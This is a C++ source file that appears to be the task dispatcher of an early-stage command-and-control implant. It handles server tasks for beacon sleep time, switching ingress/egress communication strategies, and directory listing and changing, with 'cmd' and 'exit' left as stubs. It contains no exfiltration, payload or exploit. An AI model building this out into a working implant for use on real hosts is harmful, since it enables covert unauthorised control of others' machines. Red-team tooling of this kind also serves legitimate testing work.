
#include "../protocols/json/json.h"
#include <iostream>
#include "../modules/cd.h"
#include "../modules/ls.h"
#include "../data/msgpack/msgpack.h"
#include "settings.h"

//take in the mapped object, after converted from msgpack
//all command splitting/overhead logic is done here, then passed to the appropriate modules
nlohmann::json command_tree(nlohmann::json task_data) {

    //Note, if ever a vector of tasks, do a for loop over said vector here - or have caller call command_tree multiple times. both are fair options. 

    //if (!task_data) {
    //    std::cout << "Error occured, nothign in task data" << std::endl;
    //    return 1;
    //}

    //dump task
    //std::cout << task_data.dump() << std::endl;

    std::string task_name = task_data["task"]["task_name"];

    //basic checks for the task. 
    if (task_name.empty()) {
        nlohmann::json result;
        add_text_result(result, "error", "No task provided");
        return result;
    }

    //do the tasks - no switch cuz c++ doesn;t support std;:string case switch
    if (task_name == "strat get") {
        nlohmann::json result;

        //should be an int, should prolly do some error handling here, but for now, just assume the user is giving us good data.
        std::string comms_get_function = task_data["task"]["args"]["strategy_name"];
        
        SettingsManager::instance().set("comms_get_function", comms_get_function);

        add_text_result(result, "message", "Comms Get Function set to: " + comms_get_function);
        add_text_result(result, "value", comms_get_function);

        return result;
    }
    else if (task_name == "strat post") {
        nlohmann::json result;

        //should be an int, should prolly do some error handling here, but for now, just assume the user is giving us good data.
        std::string comms_post_function = task_data["task"]["args"]["strategy_name"];
        
        SettingsManager::instance().set("comms_post_function", comms_post_function);

        add_text_result(result, "message", "Comms Post Function set to: " + comms_post_function);
        add_text_result(result, "value", comms_post_function);

        return result;
    }
    else if (task_name == "strat list") {
        nlohmann::json result;

        std::string output = "";

        //move me to strat.cpp or something, this is just a placeholder to show the concept.
        std::map<std::string, IngressFunc> get_map = SettingsManager::instance().get<std::map<std::string, IngressFunc>>("comms_get_strat_map", {});
        std::map<std::string, EgressFunc> post_map = SettingsManager::instance().get<std::map<std::string, EgressFunc>>("comms_post_strat_map", {});

        // Loop through Ingress Map
        for (const auto& [name, func] : get_map) {
            output += name + "\n";
        }

        // Loop through Egress Map
        for (const auto& [name, func] : post_map) {
            output += name + "\n";
        }

        add_text_result(result, "message", "Available Strategies:");
        add_text_result(result, "value", output);

        return result;
    }

    else if (task_name == "sleep") {
        nlohmann::json result;

        //should be an int, should prolly do some error handling here, but for now, just assume the user is giving us good data.
        int sleep_time = task_data["task"]["args"]["sleep_time"];
        
        SettingsManager::instance().set("sleep_time", sleep_time);

        add_text_result(result, "message", "Sleep set to: " + std::to_string(sleep_time));
        add_text_result(result, "value", std::to_string(sleep_time));

        return result;
    }
    else if (task_name == "ls") {
        //get args, which are named compontents in the task->args block of the task_data
        std::string directory_to_list = task_data["task"]["args"]["directory"];
        //do a validation here

        std::string list_of_files;

        //If for whatever reason, there is a blank directory, fallback to current directory. This is checked on the Client as well,but an "ls" may slip through without a dir on via the API.
        if (directory_to_list.empty()) {
            directory_to_list = "."; //set to current dir if no directory is provided
        }
        list_of_files = ls(directory_to_list);

        nlohmann::json result;
        add_text_result(result, "message", "Successfully listed files");
        add_text_result(result, "value", list_of_files);

        return result;
    }
    else if (task_name == "cd") {
        //std::string temp_path = "C:\\";

        //get args, which are named compontents in the task->args block of the task_data
        std::string directory_to_traverse_to = task_data["task"]["args"]["directory"];
        //do a validation here
        
        //setup json object to return. This will be plugged into the result. 
        nlohmann::json result;

        //confusing, sorry. TLDR, return value is non-zero here. Thanks windows. 
        //https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setcurrentdirectory
        if (!cd(directory_to_traverse_to) == 0) {
            std::string message = "Directory changed to: " + directory_to_traverse_to;
            //add in results
            add_text_result(result, "message", message);
            add_text_result(result, "value", directory_to_traverse_to);
            //return said result
            return result;
        }

        std::string message = "Failed to change directory to: " + directory_to_traverse_to;
        add_text_result(result, "message", message);
        add_text_result(result, "value", directory_to_traverse_to);
        //could have a value, ex, prior_dir as a value too. 
        return result;

    }
    else if (task_name == "cmd") {
        nlohmann::json result;
        add_text_result(result, "error", "cmd not implemented");
        return result;

    }
    else if (task_name == "exit") {
        nlohmann::json result;
        add_text_result(result, "error", "exit not implemented");
        return result;
    }
    else {
        nlohmann::json result;
        add_text_result(result, "error", "command not found");
        return result;
    }

}

//placeholder for  a beacon printf style func?
int send_to_server(std::string output) {
    std::cout << output << std::endl;
    return 0;
}